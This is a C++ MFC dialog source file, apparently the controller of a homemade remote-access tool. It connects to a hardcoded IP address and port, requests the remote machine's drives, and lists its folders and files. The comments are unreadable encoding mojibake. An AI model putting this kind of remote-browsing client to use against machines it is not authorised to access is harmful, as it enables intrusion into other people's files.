
// hackDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "hack.h"
#include "hackDlg.h"
#include "afxdialogex.h"

#include"password.h"
#include"SYS.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#endif

//�����׽���
WSADATA wsadata;
SOCKET  ServerSocket ;  
SOCKADDR_IN  ServerAdd;  //��ַ��
int port=12345;
HTREEITEM SelectNode;
typedef struct 
{
	int ID;              //����Ĵ���ID
	BYTE lpram[2048];    //���������һЩ������Ϣ
}COMMAND;

typedef struct
{
	char FileName[MAX_PATH];
	int FileLen;
	char Time[50];
	BOOL IsDir;
	BOOL Error;
	HICON hIcon;
}FILEINFO;

DWORD WINAPI CLisen(LPVOID lparam);

// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

	// �Ի�������
	enum { IDD = IDD_ABOUTBOX };

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

	// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// ChackDlg �Ի���



ChackDlg::ChackDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(ChackDlg::IDD, pParent)
	, str(_T(""))
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void ChackDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_TREE1, m_tree);
	DDX_Control(pDX, IDC_EDIT1, m_addr);
	DDX_Control(pDX, IDC_LIST1, m_list);
}

BEGIN_MESSAGE_MAP(ChackDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, &ChackDlg::OnConnnect)
//	ON_NOTIFY(TVN_SELCHANGING, IDC_TREE1, &ChackDlg::OnSelchangingTree1)
ON_NOTIFY(TVN_SELCHANGED, IDC_TREE1, &ChackDlg::OnSelchangedTree1)
END_MESSAGE_MAP()


// ChackDlg ��Ϣ�������

BOOL ChackDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	// TODO: �ڴ���Ӷ���ĳ�ʼ������

	GetDlgItem (IDC_EDIT1)->SetWindowText("125.217.40.116");    //����Ip

	//���б��
	m_ImageList_tree.Create(32,32,ILC_COLOR32,20,40);

	//����ͼ��
	HICON hicon=NULL;

	//�����ҵĵ���
	hicon=(HICON)LoadImage(AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_ICON2),IMAGE_ICON,16,16,NULL);
	m_ImageList_tree.Add(hicon);

	hicon=(HICON)LoadImage(AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_ICON1),IMAGE_ICON,16,16,NULL);
	m_ImageList_tree.Add(hicon);

	hicon=(HICON)LoadImage(AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_ICON3),IMAGE_ICON,16,16,NULL);
	m_ImageList_tree.Add(hicon);

	//m_tree��IDC_TREE�ĳ�Ա

	m_tree.SetImageList(&m_ImageList_tree,TVSIL_NORMAL);
	DWORD dwStyle=GetWindowLong(m_tree.m_hWnd,GWL_STYLE);
	dwStyle|= TVS_HASBUTTONS |TVS_HASLINES | TVS_LINESATROOT;   //+�ź��� 
	SetWindowLong (m_tree.m_hWnd,GWL_STYLE,dwStyle);
	m_hRoot=m_tree.InsertItem("�ҵĵ���",0,0,0,0);     //�õ�Զ�̵��Եľ��   
	//m_tree.InsertItem ("")
	//GetDlgItem(IDC_EDIT2)->SetWindowTextA ("������״̬");

	//��ʼ���׽���
	WORD ver=MAKEWORD (2,2);
	WSAStartup (ver,&wsadata);



	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void ChackDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void ChackDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR ChackDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}




void ChackDlg::OnConnnect()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������

	//����UpdateData()����ʹ�������IP��ַ��ÿ���
	UpdateData (true);
	if(m_addr.LineLength()==0)
	{
		MessageBox("NULL");
		return ;
	}
	//��ȡip�༭���������ip��ַ
	m_addr.GetWindowText(str);
	ServerSocket=socket(AF_INET,SOCK_STREAM,0);
	ServerAdd.sin_family=AF_INET;
	ServerAdd.sin_port =htons(port);
	//�ս̳��е���LockBuffer()���ɹ�����ʾ˵û�иĺ�����Ȼ�����CString str�������������ip
	ServerAdd.sin_addr.S_un.S_addr=inet_addr(str.GetBuffer());
	//���Ӻ���
	if(connect(ServerSocket,(SOCKADDR*)&ServerAdd,sizeof(ServerAdd))!=0)
	{
		MessageBox("����ʧ�ܣ�");
		GetDlgItem(IDC_EDIT2)->SetWindowTextA ("���ӷ�����ʧ��");
		Sleep(1000);
		GetDlgItem(IDC_EDIT2)->SetWindowTextA ("������״̬");
		return ;
	}
	else
	{
		GetDlgItem(IDC_EDIT2)->SetWindowTextA ("���ӷ������ɹ���");
		//password dlg;
		//dlg.DoModal ();
		/*char buff[20];
		if(recv(ServerSocket,buff,sizeof(buff),0)!=SOCKET_ERROR)
		{
		if(strcmp(buff,"kjinziguiteer")==0)
		{
		password dlg;
		dlg.DoModal ();
		}
		}*/

		COMMAND command;
		memset ((char*)&command,0,sizeof(command));
		command.ID =GetDriver;  
		//����õ����̵���Ϣ
		send(ServerSocket,(char*)&command,sizeof(command),0 );
		CreateThread (NULL,NULL,CLisen,this,NULL,NULL);

	}

}


DWORD WINAPI CLisen (LPVOID lparam)
{
	ChackDlg *dlg=(ChackDlg *)lparam;    //ת��Ϊ�Ի������
	COMMAND command;                    //�������˷��ص���Ϣ
	memset ((char*)&command,0,sizeof(command));
	while(true)
	{
		memset ((char*)&command,0,sizeof(command));
		if(recv(ServerSocket ,(char*)&command,sizeof(command),0)==SOCKET_ERROR )
		{
			//GetDlgItem(IDC_EDIT2)->SetWindowTextA ("���ӷ�����ʧ��");
			break;

		}
		else
		{
			switch(command.ID)
			{
			case GetDriver :
				dlg->GetDriverProc(command.lpram);
				break;
			case GetDriInfo:
				dlg->GetDriInfoProc(command.lpram);
				break;
			}
		}
	}
	closesocket(ServerSocket);
	return 0;
}

int ChackDlg::GetDriverProc(BYTE *DATE)
{
	char buff[1024];
	strcpy(buff,(char*)DATE);  //�õ�������Ϣ
	m_tree .InsertItem (buff,1,1,m_hRoot ,0);   //������˵õ�����Ϣ���Զ�̵����б��¶�
	m_tree.Expand (m_hRoot,TVE_EXPAND );
	return 0;
}

int ChackDlg::GetDriInfoProc(BYTE *DATE)
{
	FILEINFO *fi=(FILEINFO*)DATE;
	//memset((char*)&fi,0,sizeof(fi));
	if(fi->IsDir )
	{
		m_tree.InsertItem(fi->FileName,2,2,SelectNode,0);
		m_tree.Expand(SelectNode,TVE_EXPAND);
	}
	else
	{
		SHFILEINFO info;
		memset((char*)&info,0,sizeof(info));
		SHGetFileInfo(fi->FileName ,0,&info,sizeof(info),SHGFI_ICON | SHGFI_USEFILEATTRIBUTES);
		int i;
		i=m_ImageList_tree.Add(info.hIcon);  //shit ����bug����
		//i=m_ImageList .Add(info.hIcon );
		m_list.InsertItem(i,fi->FileName,i);
	}
	return 0;

}



//void ChackDlg::OnSelchangingTree1(NMHDR *pNMHDR, LRESULT *pResult)
//{
//	LPNMTREEVIEW pNMTreeView = reinterpret_cast<LPNMTREEVIEW>(pNMHDR);
//	// TODO: �ڴ���ӿؼ�֪ͨ����������
//	TVITEM item=pNMTreeView->itemNew;
//	m_list.DeleteAllItems();
//	SelectNode=item.hItem;     //��ͼ������c�̾ͱ���c��
//	if(item.hItem==m_hRoot)
//	{
//		return ;
//	}
//	HTREEITEM CurrentNode;
//	CurrentNode=item.hItem;
//	while(m_tree.GetChildItem(CurrentNode)!=NULL)
//	{
//		//�ú��������ǵ��C-->windows-->windows����ٵ��c,�����windows�µ������б�
//		m_tree.DeleteItem(m_tree.GetChildItem(CurrentNode));
//	}
//
//	CString Temp;
//	CString FullPath;
//	while(CurrentNode!=m_hRoot)
//	{
//		Temp=m_tree.GetItemText(CurrentNode);
//		if(Temp!="\\")
//		{
//			Temp+="\\";
//		}
//		FullPath+=Temp;
//		CurrentNode=m_tree.GetParentItem(CurrentNode);    //��ʱCurrentNode=m_hRoot,����ѭ��
//	}
//	COMMAND command;
//	command.ID=GetDriInfo;
//	strcpy((char*)command.lpram,FullPath);
//	if(send(ServerSocket,(char*)&command,sizeof(command),0)==SOCKET_ERROR)
//	{
//		AfxMessageBox ("���ʹ�����Ϣ����");
//	}
//	*pResult = 0;
//}


void ChackDlg::OnSelchangedTree1(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMTREEVIEW pNMTreeView = reinterpret_cast<LPNMTREEVIEW>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	TVITEM item=pNMTreeView->itemNew;
	m_list.DeleteAllItems();
	SelectNode=item.hItem;     //��ͼ������c�̾ͱ���c��
	if(item.hItem==m_hRoot)
	{
		return ;
	}
	HTREEITEM CurrentNode;
	CurrentNode=item.hItem;
	while(m_tree.GetChildItem(CurrentNode)!=NULL)
	{
		//�ú��������ǵ��C-->windows-->windows����ٵ��c,�����windows�µ������б�
		m_tree.DeleteItem(m_tree.GetChildItem(CurrentNode));
	}

	CString Temp;
	CString FullPath;
	while(CurrentNode!=m_hRoot)
	{
		Temp=m_tree.GetItemText(CurrentNode);
		if(Temp!="\\")
		{
			Temp+="\\";
		}
		FullPath=Temp+FullPath;
		CurrentNode=m_tree.GetParentItem(CurrentNode);    //��ʱCurrentNode=m_hRoot,����ѭ��
	}
	COMMAND command;
	memset((char*)&command,0,sizeof(command));//һ��Ҫ���ð���������
	command.ID=GetDriInfo;
	strcpy((char*)command.lpram,FullPath);
	if(send(ServerSocket,(char*)&command,sizeof(command),0)==SOCKET_ERROR)
	{
		AfxMessageBox ("���ʹ�����Ϣ����");
	}
	*pResult = 0;
}
